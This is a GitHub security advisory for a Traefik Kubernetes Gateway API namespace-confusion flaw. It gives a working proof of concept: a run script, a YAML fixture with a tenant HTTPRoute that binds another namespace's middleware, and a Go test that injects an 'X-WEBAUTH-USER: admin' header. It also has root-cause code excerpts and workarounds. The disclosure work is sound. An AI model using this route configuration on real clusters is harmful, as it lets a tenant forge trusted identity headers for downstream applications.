# [M] Traefik Gateway API HTTPRoute BackendRef ExtensionRef Namespace Confusion

## Summary
Severity: Medium
Advisory: GHSA-qq9q-x9w4-chhj
CVE: CVE-2026-65601
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-08-05
Source: https://github.com/advisories/GHSA-qq9q-x9w4-chhj
Type: github-advisory

## Affected
- Go: `Traefik` — affected >=3.7.0 <3.7.7

## Details
## Summary

There is a medium-severity namespace-confusion vulnerability in Traefik's Kubernetes Gateway API provider. When resolving `HTTPRoute.spec.rules[].backendRefs[].filters[].extensionRef`, Traefik used the backend Service namespace instead of the `HTTPRoute` namespace. A low-privileged route author holding a `ReferenceGrant` for a cross-namespace Service could therefore bind a Traefik `Middleware` from the backend namespace without a separate grant for that middleware. If the reused middleware sets trusted reverse-proxy identity headers, downstream applications may receive attacker-selected authenticated-identity state. The fix resolves `extensionRef` against the `HTTPRoute` namespace.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.7.7

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

## Summary

Traefik's Kubernetes Gateway API provider resolves
`HTTPRoute.spec.rules[].backendRefs[].filters[].extensionRef` in the backend
Service namespace instead of the `HTTPRoute` namespace. A low-privileged route
author with a permitted cross-namespace Service reference can therefore bind a
Traefik `Middleware` from the backend namespace without a separate grant for
that middleware. If the reused middleware sets trusted reverse-proxy identity
headers, downstream applications can receive attacker-selected authenticated
identity state.

## Description

Gateway API `ReferenceGrant` allows a namespace owner to grant a route in
another namespace permission to reference a specific backend object, such as a
`Service`. That grant should not implicitly authorize the route author to bind
other policy objects in the backend namespace.

In the affected code path, Traefik copies `backendRef.namespace` into a local
`namespace` variable. It correctly uses that namespace to validate and load the
backend `Service`, but then reuses the same namespace when resolving
`backendRef.filters[].extensionRef`. For Traefik CRD `Middleware` extension
filters, the CRD provider turns `(namespace, name)` into a dynamic middleware
reference such as:

```text
platform-privileged-auth-header@kubernetescrd
```

As a result, a tenant route in `tenant-a` can bind a middleware named
`privileged-auth-header` from the backend namespace `platform`, even though the
Gateway API `ReferenceGrant` only granted access to `platform/protected-api`
`Service`.

## Impact

The PoC demonstrates that an attacker-authored `HTTPRoute` can cause Traefik to
attach a backend-namespace `Headers` middleware to the generated backend
service. The middleware injects:

```text
X-WEBAUTH-USER: admin
```

That is a realistic downstream primitive because many applications support
trusted reverse-proxy authentication headers when deployed behind a gateway.
Separate Docker validation showed this header-auth class can map to
authenticated identities in Grafana, Gitea, Jenkins, SonarQube, and Nexus
Repository when those products are intentionally configured for reverse-proxy
authentication.

This is not a bug in those downstream applications and this PoC does not claim
direct Traefik host RCE, sandbox escape, private-key exfiltration, or default
cluster takeover. The Traefik vulnerability is unauthorized middleware binding
across a Gateway API namespace boundary.

## Proof Of Concept

### Files

<details>
<summary>run.sh</summary>

```bash
#!/usr/bin/env sh
set -eu

TARGET_REF="${TARGET_REF:-v3.7.5}"
REPO_URL="${REPO_URL:-https://github.com/traefik/traefik.git}"
SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
WORKDIR="${WORKDIR:-$(mktemp -d "${TMPDIR:-/tmp}/traefik-gw-extref-poc.XXXXXX")}"

if [ "${KEEP_WORKDIR:-0}" != "1" ]; then
	trap 'rm -rf "$WORKDIR"' EXIT INT TERM
fi

printf '[*] target_ref=%s\n' "$TARGET_REF"
printf '[*] workdir=%s\n' "$WORKDIR"

if [ -n "${TRAEFIK_SRC:-}" ]; then
	printf '[*] cloning from local source: %s\n' "$TRAEFIK_SRC"
	git clone -q "$TRAEFIK_SRC" "$WORKDIR/traefik"
	cd "$WORKDIR/traefik"
	git -c advice.detachedHead=false checkout -q "$TARGET_REF"
else
	printf '[*] cloning from remote: %s\n' "$REPO_URL"
	git -c advice.detachedHead=false clone -q --depth 1 --branch "$TARGET_REF" "$REPO_URL" "$WORKDIR/traefik"
	cd "$WORKDIR/traefik"
fi

mkdir -p pkg/provider/kubernetes/gateway/fixtures/httproute
cp "$SCRIPT_DIR/poc_gateway_extensionref_test.go" \
	pkg/provider/kubernetes/gateway/httproute_backend_filter_namespace_poc_test.go
cp "$SCRIPT_DIR/backendref_extension_filter_cross_namespace_poc.yml" \
	pkg/provider/kubernetes/gateway/fixtures/httproute/backendref_extension_filter_cross_namespace_poc.yml

if grep -Fq 'loadConfigurationFromGateways(ctx context.Context) (*dynamic.Configuration, *statusReport, error)' pkg/provider/kubernetes/gateway/kubernetes.go; then
	sed -i \
		-e 's/conf := p\.loadConfigurationFromGateways(t\.Context())/conf, _, err := p.loadConfigurationFromGateways(t.Context())/' \
		-e 's/require\.NotNil(t, conf)/require.NoError(t, err)/' \
		pkg/provider/kubernetes/gateway/httproute_backend_filter_namespace_poc_test.go
fi

printf '[*] running Gateway HTTPRoute backendRef ExtensionRef namespace-confusion PoC\n'
go test ./pkg/provider/kubernetes/gateway \
	-run '^TestPoCHTTPRouteBackendRefExtensionRefUsesBackendNamespace$' \
	-count=1 -v

printf 'POC_RESULT=PASS\n'
```

</details>

<details>
<summary>backendref_extension_filter_cross_namespace_poc.yml</summary>

```yaml
---
apiVersion: v1
kind: Service
metadata:
  name: protected-api
  namespace: platform
spec:
  ports:
    - name: web
      protocol: TCP
      port: 80
      targetPort: web

---
kind: EndpointSlice
apiVersion: discovery.k8s.io/v1
metadata:
  name: protected-api-abc
  namespace: platform
  labels:
    kubernetes.io/service-name: protected-api
addressType: IPv4
ports:
  - name: web
    port: 8080
endpoints:
  - addresses:
      - 10.10.20.10
    conditions:
      ready: true

---
kind: GatewayClass
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: shared-gateway-class
spec:
  controllerName: traefik.io/gateway-controller

---
kind: Gateway
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: shared-gateway
  namespace: infra
spec:
  gatewayClassName: shared-gateway-class
  listeners:
    - name: http
      protocol: HTTP
      port: 80
      allowedRoutes:
        kinds:
          - kind: HTTPRoute
            group: gateway.networking.k8s.io
        namespaces:
          from: All

---
kind: ReferenceGrant
apiVersion: gateway.networking.k8s.io/v1beta1
metadata:
  name: allow-tenant-route-to-service
  namespace: platform
spec:
  from:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      namespace: tenant-a
  to:
    - group: ""
      kind: Service
      name: protected-api

---
kind: HTTPRoute
apiVersion: gateway.networking.k8s.io/v1
metadata:
  name: tenant-route
  namespace: tenant-a
spec:
  parentRefs:
    - name: shared-gateway
      namespace: infra
      kind: Gateway
      group: gateway.networking.k8s.io
  hostnames:
    - attacker.example
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /
      backendRefs:
        - name: protected-api
          namespace: platform
          port: 80
          kind: Service
          group: ""
          filters:
            - type: ExtensionRef
              extensionRef:
                group: traefik.io
                kind: Middleware
                name: privileged-auth-header
```

</details>

<details>
<summary>poc_gateway_extensionref_test.go</summary>

```go
package gateway

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/traefik/traefik/v3/pkg/config/dynamic"
	"github.com/traefik/traefik/v3/pkg/middlewares/headers"
	traefikv1alpha1 "github.com/traefik/traefik/v3/pkg/provider/kubernetes/crd/traefikio/v1alpha1"
	kubefake "k8s.io/client-go/kubernetes/fake"
)

func TestPoCHTTPRouteBackendRefExtensionRefUsesBackendNamespace(t *testing.T) {
	k8sObjects, gwObjects := readResources(t, []string{"httproute/backendref_extension_filter_cross_namespace_poc.yml"})

	kubeClient := kubefake.NewClientset(k8sObjects...)
	gwClient := newGatewaySimpleClientSet(t, gwObjects...)

	client := newClientImpl(kubeClient, gwClient)
	eventCh, err := client.WatchAll(nil, make(chan struct{}))
	require.NoError(t, err)
	if len(k8sObjects) > 0 || len(gwObjects) > 0 {
		<-eventCh
	}

	var resolvedRefs []string
	p := Provider{
		EntryPoints: map[string]Entrypoint{"web": {Address: ":80"}},
		client:      client,
	}

	p.RegisterFilterFuncs(traefikv1alpha1.GroupName, "Middleware", func(name, namespace string) (string, *dynamic.Middleware, error) {
		resolvedRefs = append(resolvedRefs, namespace+"/"+name)
		return namespace + "-" + name + "@kubernetescrd", &dynamic.Middleware{
			Headers: &dynamic.Headers{
				CustomRequestHeaders: map[string]string{
					"X-WEBAUTH-USER": "admin",
				},
			},
		}, nil
	})

	conf := p.loadConfigurationFromGateways(t.Context())
	require.NotNil(t, conf)

	var serviceConfig *dynamic.Service
	for _, service := range conf.HTTP.Services {
		for _, middlewareRef := range service.Middlewares {
			if middlewareRef == "platform-privileged-auth-header@kubernetescrd" {
				serviceConfig = service
			}
		}
	}

	require.Contains(t, resolvedRefs, "platform/privileged-auth-header")
	require.Contains(t, conf.HTTP.Middlewares, "platform-privileged-auth-header@kubernetescrd")
	require.NotNil(t, serviceConfig)
	require.Contains(t, serviceConfig.Middlewares, "platform-privileged-auth-header@kubernetescrd")

	seenUser := make(chan string, 1)
	backend := http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		seenUser <- req.Header.Get("X-WEBAUTH-USER")
		rw.WriteHeader(http.StatusOK)
	})

	handler, err := headers.NewHeader(backend, *conf.HTTP.Middlewares["platform-privileged-auth-header@kubernetescrd"].Headers)
	require.NoError(t, err)

	recorder := httptest.NewRecorder()
	handler.ServeHTTP(recorder, httptest.NewRequest(http.MethodGet, "http://attacker.example/", nil))

	assert.Equal(t, http.StatusOK, recorder.Code)
	assert.Equal(t, "admin", <-seenUser)
	t.Logf("POC_RESULT_DETAIL=backend_extension_ref_resolved_namespace=%q middleware=%q injected_header=%q",
		"platform", "platform-privileged-auth-header@kubernetescrd", "X-WEBAUTH-USER: admin")
}
```

</details>

### Requirements

- `git`
- Go toolchain compatible with the target Traefik tag. `v3.7.5` uses
  `go 1.25.0`.
- Network access to clone `https://github.com/traefik/traefik.git` and download
  Go modules on first run.

No local Traefik checkout or Kubernetes cluster is required by default.

### Run

```sh
./run.sh
```

Optional target override:

```sh
TARGET_REF=v3.7.0 ./run.sh
```

Optional local-source override for faster validation:

```sh
TRAEFIK_SRC=/path/to/traefik TARGET_REF=v3.7.5 ./run.sh
```

### Expected Result

The run should end with:

```text
POC_RESULT_DETAIL=backend_extension_ref_resolved_namespace="platform" middleware="platform-privileged-auth-header@kubernetescrd" injected_header="X-WEBAUTH-USER: admin"
POC_RESULT=PASS
```

## Root Cause

Line numbers below are from:

```text
repository: https://github.com/traefik/traefik
tag:        v3.7.5
commit:     26c96a3935cafb473f4a5bae1886560d9aa4e4f0
```

### 1. Route-level filters use the route namespace

`pkg/provider/kubernetes/gateway/httproute.go:143-144`

```go
// TODO loadMiddlewares errors could change the condition.
router.Middlewares, err = p.loadMiddlewares(conf, route.Namespace, routerName, routeRule.Filters, match.Path)
```

For filters directly on `HTTPRoute.rules[]`, Traefik resolves extension filters
relative to `route.Namespace`. This matches the Gateway API
`LocalObjectReference` model.

### 2. BackendRef namespace overwrites the route namespace

`pkg/provider/kubernetes/gateway/httproute.go:240-243`

```go
namespace := route.Namespace
if backendRef.Namespace != nil && *backendRef.Namespace != "" {
	namespace = string(*backendRef.Namespace)
```

For a cross-namespace backend Service, `namespace` becomes the backend
namespace, for example `platform`.

### 3. ReferenceGrant checks only the backend object

`pkg/provider/kubernetes/gateway/httproute.go:258-266`

```go
if err := p.isReferenceGranted(kindHTTPRoute, route.Namespace, group, string(kind), string(backendRef.Name), namespace); err != nil {
	return serviceName, &metav1.Condition{
		Type:               string(gatev1.RouteConditionResolvedRefs),
		Status:             metav1.ConditionFalse,
		ObservedGeneration: route.Generation,
		LastTransitionTime: metav1.Now(),
		Reason:             string(gatev1.RouteReasonRefNotPermitted),
```

This validates permission to reference the backend object, such as
`platform/protected-api` `Service`.

### 4. The backend namespace is reused for backendRef filters

`pkg/provider/kubernetes/gateway/httproute.go:269-277`

```go
middlewares, err := p.loadMiddlewares(conf, namespace, serviceName, backendRef.Filters, pathMatch)
if err != nil {
	return serviceName, &metav1.Condition{
		Type:               string(gatev1.RouteConditionResolvedRefs),
		Status:             metav1.ConditionFalse,
		ObservedGeneration: route.Generation,
		LastTransitionTime: metav1.Now(),
```

The same `namespace` variable now points to the backend namespace. Therefore an
`ExtensionRef` inside `backendRef.filters[]` is resolved as
`platform/<middleware-name>` instead of `tenant-a/<middleware-name>`.

### 5. CRD Middleware extension refs are qualified by the namespace supplied by Gateway provider

`pkg/provider/kubernetes/crd/kubernetes.go:169-175`

```go
registry.RegisterFilterFuncs(traefikv1alpha1.GroupName, "Middleware", func(name, namespace string) (string, *dynamic.Middleware, error) {
	if len(p.Namespaces) > 0 && !slices.Contains(p.Namespaces, namespace) {
		return "", nil, fmt.Errorf("namespace %q is not allowed", namespace)
	}

	return makeID(namespace, name) + providerNamespaceSeparator + ProviderName, nil, nil
```

The namespace passed from `loadMiddlewares()` decides which CRD `Middleware`
object becomes part of the dynamic service configuration.

### 6. Service-level middlewares are applied at runtime

`pkg/server/service/service.go:186-194`

```go
if len(conf.Middlewares) > 0 {
	if m.middlewareChainBuilder == nil {
		// This should happen only in tests.
		return nil, errors.New("chain builder not defined")
	}
	chain := m.middlewareChainBuilder.BuildMiddlewareChain(ctx, conf.Middlewares)
	originalLB := lb
	var err error
	lb, err = chain.Then(lb)
```

The unauthorized middleware reference is not merely stored. Traefik applies
service-level middlewares to the backend load balancer handler during normal
HTTP service construction.

## Minimal Exploit Shape

The PoC fixture contains the essential object graph:

```text
tenant-a/HTTPRoute
  -> backendRef namespace: platform, name: protected-api
  -> backendRef.filters[].extensionRef: traefik.io/Middleware privileged-auth-header

platform/ReferenceGrant
  -> allows tenant-a HTTPRoute to reference platform/protected-api Service only

platform/protected-api Service

Traefik resolves the ExtensionRef as:
  platform/privileged-auth-header
```

In a real affected deployment, if `platform/privileged-auth-header` sets a
trusted identity header, requests sent through the tenant route can reach the
backend with that header injected by Traefik.

## Workarounds

- Avoid granting untrusted namespaces permission to attach `HTTPRoute` objects
  to shared Gateways that route to sensitive backends.
- Do not place privileged or identity-bearing Traefik `Middleware` objects in
  namespaces that can be reached by untrusted cross-namespace `HTTPRoute`
  backend references.
- Prefer route-local filters and explicitly audit
  `HTTPRoute.rules[].backendRefs[].filters[].extensionRef` usage.
- Strip trusted reverse-proxy identity headers at backend application
  boundaries unless they originate from a dedicated authentication gateway.

## Scope Boundary

Exploitation requires low-privileged route-author capability in a Kubernetes
Gateway API deployment. A remote unauthenticated web client without
`HTTPRoute` authoring capability cannot create the malicious route. If the
shared Gateway is internet-facing, the final request that triggers the
unauthorized middleware can be sent over the public network after the route is
created.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-qq9q-x9w4-chhj
- https://nvd.nist.gov/vuln/detail/CVE-2026-65601
- https://github.com/traefik/traefik/pull/13462
- https://github.com/traefik/traefik/commit/655d6324ab4a1475892a958d4bae389720a67ea9
- https://github.com/traefik/traefik
- https://www.vulncheck.com/advisories/traefik-before-namespace-confusion-via-httproute-extensionref
